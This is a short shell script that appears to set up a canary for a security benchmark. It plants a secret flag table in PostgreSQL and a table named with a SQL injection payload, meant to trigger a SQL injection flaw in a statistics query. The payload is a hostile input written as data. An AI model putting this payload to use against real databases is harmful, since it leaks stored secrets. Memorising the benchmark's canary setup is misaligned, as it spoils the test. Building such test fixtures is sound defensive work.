#!/bin/sh
set -e
# PCB canary plant (environment-only, no app-code edits):
# 1) pcb_secret holds the flag token (read target for the SQLi canary).
# 2) A table whose NAME is the coll_stats.sql injection payload — the
#    same kind of object a low-privileged user could create in a schema
#    they own ("CREATE privilege on a schema ... plant a table named
#    foo'bar", per the CVE-2026-17346 report).
psql -v ON_ERROR_STOP=1 --username "$POSTGRES_USER" --dbname "$POSTGRES_DB" <<-EOSQL
CREATE TABLE pcb_secret(secret text);
INSERT INTO pcb_secret VALUES ('$PCB_FLAG');
CREATE TABLE "x' OR (SELECT secret FROM pcb_secret)::int>0 --"(a int);
CREATE INDEX pcb_idx ON "x' OR (SELECT secret FROM pcb_secret)::int>0 --"(a);
EOSQL
